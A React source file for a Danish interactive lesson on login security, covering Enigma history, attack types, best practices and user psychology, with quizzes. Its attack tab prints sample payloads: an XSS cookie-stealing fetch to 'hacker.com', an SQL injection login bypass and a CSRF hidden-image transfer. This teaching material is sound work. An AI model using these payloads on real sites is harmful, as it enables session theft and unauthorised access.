import { useState } from 'react';
import { Box, Title, Text, Container, Paper, Tabs, Card, Group, ThemeIcon, Badge, List, Button, Progress, SimpleGrid, Accordion, Divider, Image, Alert } from '@mantine/core';
import { Shield, WarningOctagon, Book, LockKey, CodeBlock, CheckCircle, X, CaretRight, Brain, Info, Lightning, Check, Medal, Trophy } from '@phosphor-icons/react';
import { Link, useNavigate } from '@tanstack/react-router';
import { RestartButton } from '../components/RestartButton';

function Learn() {
	const [activeTab, setActiveTab] = useState<string | null>('intro');
	const [completedLessons, setCompletedLessons] = useState<string[]>([]);
	const [isProgressComplete, setIsProgressComplete] = useState(false);
	const [showQuiz, setShowQuiz] = useState(false);
	const [quizAnswered, setQuizAnswered] = useState(false);
	const [showAchievement, setShowAchievement] = useState({ show: false, title: '' });

	const navigate = useNavigate();

	const markLessonCompleted = (lessonId: string) => {
		if (!completedLessons.includes(lessonId)) {
			setCompletedLessons([...completedLessons, lessonId]);
			setShowAchievement({
				show: true,
				title: `Afsnit gennemført: ${lessonId === 'intro' ? 'Introduktion' : lessonId === 'history' ? 'Historisk Kontekst' : lessonId === 'attacks' ? 'Angrebstyper' : lessonId === 'best-practices' ? 'Bedste Praksis' : lessonId === 'psychology' ? 'Psykologiske Aspekter' : 'Nyt afsnit'}`,
			});
		}
	};

	const isLessonCompleted = (lessonId: string) => {
		return completedLessons.includes(lessonId);
	};

	const calculateProgress = () => {
		const totalLessons = 5;
		const progress = Math.round((completedLessons.length / totalLessons) * 100);

		if (progress === 100 && !isProgressComplete) {
			setIsProgressComplete(true);
			setShowAchievement({
				show: true,
				title: 'Læringsmodul 100% Gennemført!',
			});
		}

		return progress;
	};

	const getNextTab = (currentTab: string | null) => {
		const tabs = ['intro', 'history', 'attacks', 'best-practices', 'psychology'];
		const currentIndex = tabs.indexOf(currentTab || 'intro');
		return tabs[(currentIndex + 1) % tabs.length];
	};

	const AchievementPopup = ({ title, show, onComplete }: { title: string; show: boolean; onComplete: () => void }) => {
		useState(() => {
			if (show) {
				const timer = setTimeout(() => {
					onComplete();
				}, 3000);

				return () => clearTimeout(timer);
			}
		});

		return show ? (
			<Paper style={{ position: 'fixed', bottom: 20, right: 20, zIndex: 1000 }} withBorder p='md' className='bg-gradient-to-r from-yellow-900 to-orange-900'>
				<Group>
					<ThemeIcon size='lg' radius='xl' color='yellow'>
						<Trophy size={20} weight='fill' />
					</ThemeIcon>
					<div>
						<Text size='xs' c='dimmed'>
							Bedrift Opnået!
						</Text>
						<Text fw='bold'>{title}</Text>
					</div>
				</Group>
			</Paper>
		) : null;
	};

	const QuizComponent = ({ question, options, correctIndex, lessonId }: { question: string; options: string[]; correctIndex: number; lessonId: string }) => (
		<Card withBorder className='bg-blue-900/30 mt-4'>
			<Title order={4} mb={12}>
				Quiz: Test din viden
			</Title>
			<Text mb={16}>{question}</Text>

			<SimpleGrid cols={2} spacing='sm'>
				{options.map((option, index) => (
					<Button
						key={index}
						variant={quizAnswered ? (index === correctIndex ? 'filled' : 'light') : 'default'}
						color={quizAnswered ? (index === correctIndex ? 'green' : 'red') : 'blue'}
						onClick={() => {
							setQuizAnswered(true);
							if (index === correctIndex) {
								markLessonCompleted(lessonId);
							}
						}}
						leftSection={quizAnswered && index === correctIndex ? <Check size={16} /> : null}
						disabled={quizAnswered}
					>
						{option}
					</Button>
				))}
			</SimpleGrid>

			{quizAnswered && (
				<Group mt={16} justify='flex-end'>
					<Button
						color='blue'
						onClick={() => {
							setQuizAnswered(false);
							setShowQuiz(false);
							setActiveTab(getNextTab(activeTab));
						}}
					>
						Fortsæt til næste emne
					</Button>
				</Group>
			)}
		</Card>
	);

	return (
		<Box p='xl'>
			<Container size='xl'>
				<Paper withBorder p='lg' radius='md' className='bg-blue-900/10 text-white mb-6'>
					<Group justify='space-between' className='mb-4'>
						<Group>
							<Book size={30} className='text-blue-400' weight='fill' />
							<Title order={2}>Lær om Login Sikkerhed</Title>
						</Group>
						<Badge color='blue' size='lg'>
							{calculateProgress()}% Gennemført
						</Badge>
					</Group>

					<Progress value={calculateProgress()} size='md' className='mb-4' color='blue' />

					<Text size='lg' mb={24}>
						Udforsk disse lektioner for at lære om vigtigheden af sikker login praksis og hvordan hackerangreb fungerer.
					</Text>

					<Tabs value={activeTab} onChange={setActiveTab} className='mb-6' color='blue'>
						<Tabs.List grow>
							<Tabs.Tab value='intro' leftSection={<Info size={16} />}>
								Introduktion
							</Tabs.Tab>
							<Tabs.Tab value='history' leftSection={<Book size={16} />}>
								Historisk Kontekst
							</Tabs.Tab>
							<Tabs.Tab value='attacks' leftSection={<Lightning size={16} />}>
								Angrebstyper
							</Tabs.Tab>
							<Tabs.Tab value='best-practices' leftSection={<Shield size={16} />}>
								Bedste Praksis
							</Tabs.Tab>
							<Tabs.Tab value='psychology' leftSection={<Brain size={16} />}>
								Psykologiske Aspekter
							</Tabs.Tab>
						</Tabs.List>

						<Tabs.Panel value='intro' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Login Sikkerhed Basis
									</Title>

									<Image src='./enigma.png' alt='Enigma maskine' height={150} fit='contain' className='mb-4' />

									<Text mb={16}>Login-systemer er indgangen til digitale tjenester og beskytter følsomme oplysninger. De er et af de mest almindelige mål for hackere.</Text>

									<List spacing='sm' mb={16}>
										<List.Item icon={<CaretRight size={14} />}>Kryptografi og autentifikation</List.Item>
										<List.Item icon={<CaretRight size={14} />}>Almindelige sårbarheder</List.Item>
										<List.Item icon={<CaretRight size={14} />}>Bedste sikkerhedspraksis</List.Item>
									</List>

									<Button color='blue' onClick={() => markLessonCompleted('intro')} fullWidth>
										{isLessonCompleted('intro') ? (
											<>
												<CheckCircle size={18} className='mr-2' weight='fill' />
												Gennemført
											</>
										) : (
											'Marker som gennemført'
										)}
									</Button>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={12}>
										Læringsveje
									</Title>

									<Text size='sm' mb={16}>
										Der er to måder at udforske dette læringsmateriale på:
									</Text>

									<List spacing='md' mb={20}>
										<List.Item
											icon={
												<ThemeIcon color='green' size='md' radius='xl'>
													<LockKey size={16} weight='bold' />
												</ThemeIcon>
											}
										>
											<Text fw='bold'>Guidet rejse</Text>
											<Text size='sm'>Følg fanebladsinddelingen fra venstre til højre for en struktureret tilgang</Text>
										</List.Item>
										<List.Item
											icon={
												<ThemeIcon color='orange' size='md' radius='xl'>
													<Brain size={16} weight='bold' />
												</ThemeIcon>
											}
										>
											<Text fw='bold'>Praktisk læring</Text>
											<Text size='sm'>Udforsk de interaktive login-sider og sammenlign sikker og usikker implementation</Text>
										</List.Item>
									</List>

									<Text size='sm' mb={16}>
										Uanset hvilken tilgang du vælger, anbefales det at tage quizzerne for at teste din forståelse og opnå bedrifter undervejs.
									</Text>
								</Card>
							</SimpleGrid>

							{!isLessonCompleted('intro') && !showQuiz && (
								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
									Tag quizzen for at fortsætte
								</Button>
							)}

							{showQuiz && !isLessonCompleted('intro') && <QuizComponent question='Hvad er den største fordel ved at bruge stærk login-sikkerhed?' options={['Det ser professionelt ud', 'Det beskytter brugerdata mod uautoriseret adgang', 'Det øger hjemmesidens hastighed', 'Det reducerer serveromkostningerne']} correctIndex={1} lessonId='intro' />}
						</Tabs.Panel>

						<Tabs.Panel value='history' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Enigma-maskinen
									</Title>

									<Image src='https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/EnigmaMachineLabeled.jpg/300px-EnigmaMachineLabeled.jpg' alt='Enigma maskine' mah={240} fit='contain' className='mb-4' />

									<Text mb={16}>Enigma-maskinen var en avanceret krypteringsanordning brugt af Tyskland under 2. Verdenskrig. Den skabte koder der dengang blev anset som ubrydelige.</Text>

									<List
										spacing='sm'
										mb={16}
										icon={
											<ThemeIcon color='blue' size='sm' radius='xl'>
												<Info size={14} />
											</ThemeIcon>
										}
									>
										<List.Item>Brugte roterende hjul til at ændre bogstaver i beskeder</List.Item>
										<List.Item>Hver dag brugtes nye indstillinger til at ændre koden</List.Item>
										<List.Item>Alan Turing og holdet ved Bletchley Park brød koden</List.Item>
									</List>

									{!isLessonCompleted('history') && (
										<Button color='blue' onClick={() => markLessonCompleted('history')} fullWidth>
											{isLessonCompleted('history') ? (
												<>
													<CheckCircle size={18} className='mr-2' weight='fill' />
													Gennemført
												</>
											) : (
												'Marker som gennemført'
											)}
										</Button>
									)}
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Fra Enigma til Moderne Login
									</Title>

									<Text mb={16}>Der er tydelige paralleller mellem Enigma og moderne login-sikkerhed:</Text>

									<SimpleGrid cols={1} spacing='md' mb={16}>
										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Kompleksitet
											</Title>
											<Text size='sm'>Enigma brugte roterende hjul. Moderne login bruger hashing og kryptering.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Svagheder
											</Title>
											<Text size='sm'>Enigma var sårbar over for mønstre. Moderne login er sårbar over for brugeradfærd og dårlig kode.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Mennesket som svaghed
											</Title>
											<Text size='sm'>Både Enigma og moderne sikkerhedssystemer har mennesker som det svageste led i kæden.</Text>
										</Paper>
									</SimpleGrid>

									{!isLessonCompleted('history') && !showQuiz && (
										<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth>
											Tag quizzen for at fortsætte
										</Button>
									)}

									{showQuiz && !isLessonCompleted('history') && <QuizComponent question='Hvilken historisk kryptografisk enhed har påvirket moderne sikkerhedstankegang?' options={['Smartphones', 'Enigma-maskinen', 'Håndskrevne breve', 'Fax-maskiner']} correctIndex={1} lessonId='history' />}
								</Card>
							</SimpleGrid>
						</Tabs.Panel>

						<Tabs.Panel value='attacks' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Almindelige Angrebstyper
									</Title>

									<Tabs variant='pills' radius='md' defaultValue='xss' className='mb-4' color='red'>
										<Tabs.List grow>
											<Tabs.Tab value='xss' leftSection={<CodeBlock size={16} />}>
												XSS
											</Tabs.Tab>
											<Tabs.Tab value='sql' leftSection={<CodeBlock size={16} />}>
												SQL Injection
											</Tabs.Tab>
											<Tabs.Tab value='csrf' leftSection={<CodeBlock size={16} />}>
												CSRF
											</Tabs.Tab>
										</Tabs.List>

										<Tabs.Panel value='xss' pt='md'>
											<Title order={4} mb={8}>
												Cross-Site Scripting (XSS)
											</Title>

											<Text mb={12}>XSS-angreb indsprøjter ondsindet kode i en webside, så den udføres i andre brugeres browsere. Dette kan bruges til at stjæle cookies, session-tokens eller andre følsomme oplysninger.</Text>

											<div className='font-mono text-xs bg-red-950 overflow-x-auto p-2 border border-red-500 rounded mb-4'>{`<input value="<script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>">`}</div>

											<Title order={6} mb={4}>
												Beskyttelse
											</Title>
											<List size='sm' mb={12}>
												<List.Item>Sanitér alt brugerinput før det vises</List.Item>
												<List.Item>Anvend Content Security Policy (CSP)</List.Item>
												<List.Item>Brug frameworks som React, der automatisk eskaperer HTML</List.Item>
											</List>

											<Link to='/login-unsafe' className='w-full'>
												<Button color='red' variant='light' fullWidth>
													Se XSS Demo
												</Button>
											</Link>
										</Tabs.Panel>

										<Tabs.Panel value='sql' pt='md'>
											<Title order={4} mb={8}>
												SQL Injection
											</Title>

											<Text mb={12}>SQL-injektion manipulerer database-forespørgsler ved at indsprøjte ondsindet SQL-kode, hvilket kan give uautoriseret adgang til data eller ændre database-indhold.</Text>

											<div className='font-mono text-xs bg-red-950 overflow-x-auto p-2 border border-red-500 rounded mb-4'>
												{`username: admin' OR 1=1 --
query: SELECT * FROM users WHERE username='admin' OR 1=1 --' AND password='anything'`}
											</div>

											<Title order={6} mb={4}>
												Beskyttelse
											</Title>
											<List size='sm' mb={12}>
												<List.Item>Brug parameteriserede forespørgsler eller prepared statements</List.Item>
												<List.Item>Anvend ORM (Object-Relational Mapping) værktøjer</List.Item>
												<List.Item>Validér og rens alt brugerinput</List.Item>
											</List>

											<Link to='/login-unsafe' className='w-full'>
												<Button color='red' variant='light' fullWidth>
													Se SQL Injection Demo
												</Button>
											</Link>
										</Tabs.Panel>

										<Tabs.Panel value='csrf' pt='md'>
											<Title order={4} mb={8}>
												Cross-Site Request Forgery (CSRF)
											</Title>

											<Text mb={12}>CSRF-angreb tvinger brugere til at udføre uønskede handlinger på webapplikationer, hvor de er logget ind. Angribere udnytter, at browseren automatisk inkluderer cookies i anmodninger.</Text>

											<div className='font-mono text-xs bg-red-950 overflow-x-auto p-2 border border-red-500 rounded mb-4'>
												{`<!-- Ondsindet webside -->
<img src="https://bank.com/transfer?to=hacker&amount=1000" style="display:none">`}
											</div>

											<Title order={6} mb={4}>
												Beskyttelse
											</Title>
											<List size='sm' mb={12}>
												<List.Item>Implementér CSRF-tokens i alle formularer</List.Item>
												<List.Item>Brug SameSite cookie-attributten</List.Item>
												<List.Item>Kræv bekræftelse for følsomme handlinger</List.Item>
											</List>

											<Link to='/login-safe' className='w-full'>
												<Button color='green' variant='light' fullWidth>
													Se CSRF Beskyttelse
												</Button>
											</Link>
										</Tabs.Panel>
									</Tabs>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Andre Sikkerhedstrusler
									</Title>

									<SimpleGrid cols={2} spacing='md' mb={20}>
										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
											<Group mb={8}>
												<ThemeIcon color='red' size='md' radius='xl'>
													<X size={16} weight='bold' />
												</ThemeIcon>
												<Text fw='bold'>Brute Force</Text>
											</Group>
											<Text size='sm'>Systematisk afprøvning af alle mulige adgangskoder indtil den rigtige findes. Beskyttelse: Rate limiting, account lockout, captchas.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
											<Group mb={8}>
												<ThemeIcon color='red' size='md' radius='xl'>
													<X size={16} weight='bold' />
												</ThemeIcon>
												<Text fw='bold'>Credential Stuffing</Text>
											</Group>
											<Text size='sm'>Brug af lækkede brugernavn/adgangskode-kombinationer fra ét site på andre sites. Beskyttelse: Unikke adgangskoder, to-faktor autentifikation.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
											<Group mb={8}>
												<ThemeIcon color='red' size='md' radius='xl'>
													<X size={16} weight='bold' />
												</ThemeIcon>
												<Text fw='bold'>Phishing</Text>
											</Group>
											<Text size='sm'>Falske emails eller websites designet til at narre brugere til at afsløre login-oplysninger. Beskyttelse: Brugeruddannelse, HTTPS, anti-phishing værktøjer.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
											<Group mb={8}>
												<ThemeIcon color='red' size='md' radius='xl'>
													<X size={16} weight='bold' />
												</ThemeIcon>
												<Text fw='bold'>Man-in-the-Middle</Text>
											</Group>
											<Text size='sm'>Ondsindet aktør opsnappper kommunikation mellem bruger og server. Beskyttelse: HTTPS, certificate pinning, kryptering.</Text>
										</Paper>
									</SimpleGrid>

									<Title order={4} mb={12}>
										Angrebsstatistik
									</Title>

									<Text mb={20}>Login-relaterede angreb er en af de mest almindelige indgangsveje for cyberkriminelle. Ifølge sikkerhedsrapporter udgør credential stuffing og brute force angreb over 60% af alle angreb mod webapplikationer.</Text>

									<Button color='blue' onClick={() => markLessonCompleted('attacks')} fullWidth>
										{isLessonCompleted('attacks') ? (
											<>
												<CheckCircle size={18} className='mr-2' weight='fill' />
												Gennemført
											</>
										) : (
											'Marker som gennemført'
										)}
									</Button>
								</Card>
							</SimpleGrid>

							{!isLessonCompleted('attacks') && !showQuiz && (
								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
									Tag quizzen for at fortsætte
								</Button>
							)}

							{showQuiz && !isLessonCompleted('attacks') && <QuizComponent question='Hvad er SQL Injection?' options={['En type anti-virus software', 'Et angreb der manipulerer database-forespørgsler via brugerinput', 'Et værktøj til at teste webside-hastighed', 'Et system til at tilføje data til en database']} correctIndex={1} lessonId='attacks' />}
						</Tabs.Panel>

						<Tabs.Panel value='best-practices' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Bedste Praksis for Login Sikkerhed
									</Title>

									<Accordion variant='separated' mb={20}>
										<Accordion.Item value='password-storage'>
											<Accordion.Control icon={<Shield size={18} className='text-green-400' />}>
												<Text fw='bold'>Sikker Adgangskode Opbevaring</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<List spacing='sm'>
													<List.Item>Gem aldrig adgangskoder i klartekst</List.Item>
													<List.Item>Brug stærke hashing-algoritmer som bcrypt, Argon2 eller PBKDF2</List.Item>
													<List.Item>Tilføj unikke salt-værdier til hver adgangskode før hashing</List.Item>
													<List.Item>Anvend tilstrækkelige arbejdsfaktorer for at modstå brute force</List.Item>
												</List>

												<div className='font-mono text-xs bg-green-950 overflow-x-auto p-2 border border-green-500 rounded my-4'>
													{`// Eksempel med bcrypt (Node.js)
const bcrypt = require('bcrypt');
const saltRounds = 12;

// Hashing af adgangskode
const hashedPassword = await bcrypt.hash(password, saltRounds);

// Verificering af adgangskode
const isMatch = await bcrypt.compare(inputPassword, hashedPassword);`}
												</div>
											</Accordion.Panel>
										</Accordion.Item>

										<Accordion.Item value='authentication'>
											<Accordion.Control icon={<Shield size={18} className='text-green-400' />}>
												<Text fw='bold'>Robust Autentifikation</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<List spacing='sm'>
													<List.Item>Implementér to-faktor autentifikation (2FA)</List.Item>
													<List.Item>Kræv stærke adgangskoder (længde, kompleksitet, ingen almindelige ord)</List.Item>
													<List.Item>Brug sikre session management med korrekt konfigurerede cookies</List.Item>
													<List.Item>Implementér rate limiting og account lockout for at forhindre brute force</List.Item>
												</List>

												<Text size='sm' mt={12}>
													To-faktor autentifikation giver et ekstra sikkerhedslag ved at kræve noget brugeren har (f.eks. en mobiltelefon) udover noget brugeren ved (adgangskoden).
												</Text>
											</Accordion.Panel>
										</Accordion.Item>

										<Accordion.Item value='csrf-protection'>
											<Accordion.Control icon={<Shield size={18} className='text-green-400' />}>
												<Text fw='bold'>CSRF-beskyttelse</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<Text size='sm' mb={12}>
													Cross-Site Request Forgery (CSRF) beskyttelse forhindrer angribere i at udføre handlinger på brugerens vegne.
												</Text>

												<List spacing='sm'>
													<List.Item>Generér unikke CSRF-tokens for hver session</List.Item>
													<List.Item>Inkluder tokens i alle formularer og AJAX-anmodninger</List.Item>
													<List.Item>Validér tokens på serversiden for hver anmodning der ændrer tilstand</List.Item>
													<List.Item>Brug SameSite cookie-attributten</List.Item>
												</List>

												<div className='font-mono text-xs bg-green-950 overflow-x-auto p-2 border border-green-500 rounded my-4'>
													{`// Generér CSRF token
const csrfToken = crypto.randomBytes(16).toString('hex');
req.session.csrfToken = csrfToken;

// På klientsiden i alle formularer
<input type="hidden" name="csrf_token" value="${'{csrfToken}'}" />

// Validér token på server
if (req.body.csrf_token !== req.session.csrfToken) {
  return res.status(403).send('Ugyldig CSRF token');
}`}
												</div>
											</Accordion.Panel>
										</Accordion.Item>

										<Accordion.Item value='input-validation'>
											<Accordion.Control icon={<Shield size={18} className='text-green-400' />}>
												<Text fw='bold'>Input Validering og Sanitering</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<Text size='sm' mb={12}>
													Validering og sanitering beskytter mod XSS, SQL-injektion og andre indsprøjtningsangreb.
												</Text>

												<List spacing='sm'>
													<List.Item>Valider alle brugerinput på både klient- og serverside</List.Item>
													<List.Item>Brug whitelisting i stedet for blacklisting når muligt</List.Item>
													<List.Item>Sanitér output, der vises tilbage til brugeren</List.Item>
													<List.Item>Anvend prepared statements eller parameteriserede forespørgsler for database</List.Item>
												</List>

												<div className='font-mono text-xs bg-green-950 overflow-x-auto p-2 border border-green-500 rounded my-4'>
													{`// Sanitering af input
const sanitized = DOMPurify.sanitize(userInput);

// Parameteriserede database-forespørgsler
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, passwordHash]);`}
												</div>
											</Accordion.Panel>
										</Accordion.Item>
									</Accordion>

									<Button color='blue' onClick={() => markLessonCompleted('best-practices')} fullWidth>
										{isLessonCompleted('best-practices') ? (
											<>
												<CheckCircle size={18} className='mr-2' weight='fill' />
												Gennemført
											</>
										) : (
											'Marker som gennemført'
										)}
									</Button>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Sikkerhedssammenligning
									</Title>

									<Paper withBorder p='md' radius='md' className='bg-blue-900/40 mb-4'>
										<Group justify='space-between' mb={8}>
											<Group>
												<Shield size={20} className='text-green-400' weight='fill' />
												<Text fw='bold'>Sikker Implementation</Text>
											</Group>
											<Badge color='green'>Anbefalet</Badge>
										</Group>

										<SimpleGrid cols={2} spacing='xs'>
											<Text size='sm'>✓ Adgangskoder hashes og saltes</Text>
											<Text size='sm'>✓ CSRF-beskyttelse</Text>
											<Text size='sm'>✓ Input sanitering mod XSS</Text>
											<Text size='sm'>✓ Rate limiting</Text>
											<Text size='sm'>✓ Parameteriserede queries</Text>
											<Text size='sm'>✓ Sikre, HttpOnly cookies</Text>
										</SimpleGrid>
									</Paper>

									<Paper withBorder p='md' radius='md' className='bg-red-900/40 mb-20'>
										<Group justify='space-between' mb={8}>
											<Group>
												<WarningOctagon size={20} className='text-red-400' weight='fill' />
												<Text fw='bold'>Usikker Implementation</Text>
											</Group>
											<Badge color='red'>Farlig</Badge>
										</Group>

										<SimpleGrid cols={2} spacing='xs'>
											<Text size='sm'>✗ Klartekst adgangskoder</Text>
											<Text size='sm'>✗ Ingen CSRF-tokens</Text>
											<Text size='sm'>✗ Sårbar over for XSS</Text>
											<Text size='sm'>✗ Ubegrænset login-forsøg</Text>
											<Text size='sm'>✗ Sårbar over for SQL-injektion</Text>
											<Text size='sm'>✗ Usikker session håndtering</Text>
										</SimpleGrid>
									</Paper>

									<Group justify='space-between'>
										<Button variant='light' color='green' onClick={() => navigate({ to: '/login-safe' })}>
											Prøv Sikker Login
										</Button>

										<Button variant='light' color='red' onClick={() => navigate({ to: '/login-unsafe' })}>
											Prøv Usikker Login
										</Button>
									</Group>
								</Card>
							</SimpleGrid>

							{!isLessonCompleted('best-practices') && !showQuiz && (
								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
									Tag quizzen for at fortsætte
								</Button>
							)}

							{showQuiz && !isLessonCompleted('best-practices') && <QuizComponent question='Hvad er den sikreste måde at gemme brugeradgangskoder på?' options={['I en tekstfil på serveren', 'I klartekst i databasen', 'Hashet og saltet med en sikker algoritme', 'Base64-encodet']} correctIndex={2} lessonId='best-practices' />}
						</Tabs.Panel>

						<Tabs.Panel value='psychology' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Psykologiske Aspekter af Sikkerhed
									</Title>

									<Text mb={16}>Forståelse af menneskelig psykologi er afgørende for at bygge effektive sikkerhedssystemer. Mange sikkerhedsbrister skyldes ikke tekniske fejl, men menneskers adfærd og beslutninger.</Text>

									<SimpleGrid cols={2} spacing='md' mb={20}>
										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Bekvemlighed vs. Sikkerhed
											</Title>
											<Text size='sm'>Mennesker prioriterer ofte bekvemmelighed over sikkerhed og vælger nemmere men mindre sikre muligheder. Dette er grunden til at mange genbruger adgangskoder eller vælger simple koder, der er lette at huske.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Social Engineering
											</Title>
											<Text size='sm'>Social engineering udnytter menneskelig tillid og psykologiske tendenser. Teknikker som phishing, pretexting og baiting udnytter menneskers naturlige tilbøjelighed til at stole på andre.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Sikkerhedstræthed
											</Title>
											<Text size='sm'>For mange sikkerhedskrav fører til "sikkerhedstræthed", hvor brugere udvikler arbejdsomgåelser eller ignorerer sikkerhedsforholdsregler helt. Balance er nøglen til effektiv sikkerhed.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Risikoperception
											</Title>
											<Text size='sm'>Mennesker har en tendens til at undervurdere cybersikkerhedsrisici, da de ofte er usynlige eller abstrakte. Dette fører til manglende motivation til at følge sikkerhedspraksis.</Text>
										</Paper>
									</SimpleGrid>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Designprincipper for Brugervenlig Sikkerhed
									</Title>

									<Text mb={16}>At forene god sikkerhed med god brugeroplevelse er muligt ved at følge disse principper:</Text>

									<List
										spacing='md'
										mb={20}
										icon={
											<ThemeIcon color='green' size='md' radius='xl'>
												<Check size={16} weight='bold' />
											</ThemeIcon>
										}
									>
										<List.Item>
											<Text fw='bold'>Gør det nemt at gøre det rigtige</Text>
											<Text size='sm'>Design systemer, hvor den sikreste handling også er den nemmeste. F.eks. brug af adgangskode-managers med auto-udfyldning.</Text>
										</List.Item>

										<List.Item>
											<Text fw='bold'>Gør sikkerhed synlig og forståelig</Text>
											<Text size='sm'>Giv klare, relevante sikkerhedsfeedback til brugerne. Vis f.eks. adgangskodestyrke i realtid med visuelt feedback.</Text>
										</List.Item>

										<List.Item>
											<Text fw='bold'>Minimér kognitiv belastning</Text>
											<Text size='sm'>Reducér mængden af sikkerhedsbeslutninger, brugere skal tage. Brug fornuftige standardindstillinger der favoriserer sikkerhed.</Text>
										</List.Item>

										<List.Item>
											<Text fw='bold'>Design for fejl</Text>
											<Text size='sm'>Antag at brugere vil lave fejl, og design systemer der kan håndtere disse fejl sikkert. Tillad sikker nulstilling af adgangskoder med flere verifikationstrin.</Text>
										</List.Item>
									</List>

									<Divider my='md' />

									<Group justify='space-between' mb={16}>
										<Title order={5}>Citat:</Title>
										<Badge color='blue'>Indsigt</Badge>
									</Group>

									<Paper withBorder p='md' radius='md' className='bg-blue-900/40 mb-12 italic'>
										<Text>"Hvis du tror teknologi kan løse dine sikkerhedsproblemer, forstår du hverken problemerne eller teknologien."</Text>
										<Text size='sm' ta='right' mt={8}>
											— Bruce Schneier, Sikkerhedsekspert
										</Text>
									</Paper>

									<Button color='blue' onClick={() => markLessonCompleted('psychology')} fullWidth>
										{isLessonCompleted('psychology') ? (
											<>
												<CheckCircle size={18} className='mr-2' weight='fill' />
												Gennemført
											</>
										) : (
											'Marker som gennemført'
										)}
									</Button>
								</Card>
							</SimpleGrid>

							{!isLessonCompleted('psychology') && !showQuiz && (
								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
									Tag quizzen for at fortsætte
								</Button>
							)}

							{showQuiz && !isLessonCompleted('psychology') && <QuizComponent question='Hvorfor vælger mange brugere svage adgangskoder selvom de ved det er usikkert?' options={['De har ikke nok teknisk viden', 'De prioriterer bekvemmelighed over sikkerhed', 'De tror ikke deres konti er værdifulde', 'De stoler på at firmaerne beskytter dem']} correctIndex={1} lessonId='psychology' />}

							{completedLessons.includes('psychology') && (
								<Box mt={16}>
									<Alert color='green' className='mb-6'>
										<Group>
											<Medal size={24} weight='fill' className='text-yellow-400' />
											<Text fw='bold'>Tillykke! Du har nu lært de grundlæggende principper om login-sikkerhed.</Text>
										</Group>
									</Alert>

									<Text mb={16}>Nu er det tid til at se sikkerhedsprincipperne i praksis. Vælg en af mulighederne nedenfor:</Text>

									<SimpleGrid cols={2} spacing='lg'>
										<Card withBorder className='bg-green-900/20'>
											<Title order={5} mb={8}>
												Prøv Sikker Login
											</Title>
											<Text size='sm' mb={12}>
												Se hvordan en sikker loginside implementerer beskyttelse mod forskellige angreb.
											</Text>
											<Button color='green' rightSection={<CaretRight size={16} />} onClick={() => navigate({ to: '/login-safe' })} fullWidth>
												Gå til Sikker Login
											</Button>
										</Card>

										<Card withBorder className='bg-red-900/20'>
											<Title order={5} mb={8}>
												Prøv Usikker Login
											</Title>
											<Text size='sm' mb={12}>
												Opdag sårbarheder i en usikker loginside og prøv forskellige angreb.
											</Text>
											<Button color='red' rightSection={<CaretRight size={16} />} onClick={() => navigate({ to: '/login-unsafe' })} fullWidth>
												Gå til Usikker Login
											</Button>
										</Card>
									</SimpleGrid>
								</Box>
							)}
						</Tabs.Panel>
					</Tabs>
				</Paper>
			</Container>

			<RestartButton />

			<AchievementPopup show={showAchievement.show} title={showAchievement.title} onComplete={() => setShowAchievement({ show: false, title: '' })} />
		</Box>
	);
}

export default Learn;
